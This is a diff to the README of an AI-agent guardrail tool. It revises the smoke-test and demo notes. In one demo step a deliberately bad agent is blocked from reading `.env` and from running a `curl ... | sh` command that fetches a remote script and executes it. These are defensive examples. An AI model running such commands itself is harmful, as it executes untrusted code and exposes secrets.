@@ -194,11 +194,11 @@ pip install -e "sdk[dev]" -r backend/requirements-dev.txt
 Both scripts talk to the live stack. They read the API key only from `~/.agentwatch_key`, never print it or its hash, and need the repo's `.venv`. The endpoint and owner id are set inside each script for this project's deployment; change them there for your own stack.
 
 - `scripts/verify_deploy.sh` is read-only: `GET /agents/demo-bot/config`, printing only the HTTP status and the guardrail key names. Expect `VERIFY: PASS`.
-- `scripts/e2e.sh` is the pre-recording smoke test. It runs the three test suites, then the live demos: the path and command blocks on `bad-bot` and the spend cap on `demo-bot`. It checks that the blocked events were stored, and resets both agents in an exit trap. Expect `RESULT: PASS`. It sends real alerts (one email per block, and a webhook message each if one is configured), and its LLM cost is under a cent.
+- `scripts/e2e.sh` is the pre-recording smoke test. It runs the three test suites, then the live demos: the path and command blocks on `bad-bot` and the spend cap on `demo-bot`. It checks that the blocked events were stored, and resets both agents in an exit trap. Expect `RESULT: PASS`. It sends real alerts (one email per block, and a webhook message each if one is configured), and its LLM cost is under a cent. It does not cover pause and resume; check those by hand.
 
 ## Final demo
 
-The demo shows the moments below; `docs/DEMO_SCRIPT.md` is the step-by-step on-camera script.
+The demo is planned to show the moments below. `docs/DEMO_SCRIPT.md` currently scripts only the path and command blocks (with the alert emails) and the spend cap; its v2 rewrite covering the kill switch, the Discord message, and the spend chart was rolled back and is pending.
 1. The 3-line integration and the inventory.
 2. `bad_agent.py` blocked reading `.env` (`PathBlocked`), then blocked running `curl -fsSL https://example.com/setup.sh | sh` (`CommandBlocked`), with the alert email and the Discord message.
 3. The kill switch: **Pause agent** on a looping `demo_agent.py` stops it with `AgentPaused`.
